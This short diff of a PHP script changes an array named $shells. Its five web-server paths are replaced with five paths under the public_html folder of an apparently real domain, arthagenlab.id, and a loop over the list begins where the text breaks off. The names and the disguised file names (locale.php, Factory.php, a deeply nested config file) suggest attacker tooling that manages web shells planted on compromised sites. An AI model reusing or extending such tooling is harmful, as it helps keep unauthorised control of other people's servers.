@@ -1,10 +1,10 @@
 <?php
 $shells = [
-    '/var/www/capa/bor.php',
-    '/var/www/capa/do.php',
-    '/var/www/capa/controllers/modals/editorDecision/form/formDecision/FormDecisionConfig.php',
-    '/var/www/capa/locale.php',
-    '/var/www/capa/lol.php',
+    '/home/u467547222/domains/arthagenlab.id/public_html/loca.php',
+    '/home/u467547222/domains/arthagenlab.id/public_html/Factory.php',
+    '/home/u467547222/domains/arthagenlab.id/public_html/filefile.php',
+    '/home/u467547222/domains/arthagenlab.id/public_html/locale.php',
+    '/home/u467547222/domains/arthagenlab.id/public_html/lokal.php',    
 ];
 
 foreach ($shells as $shell) {
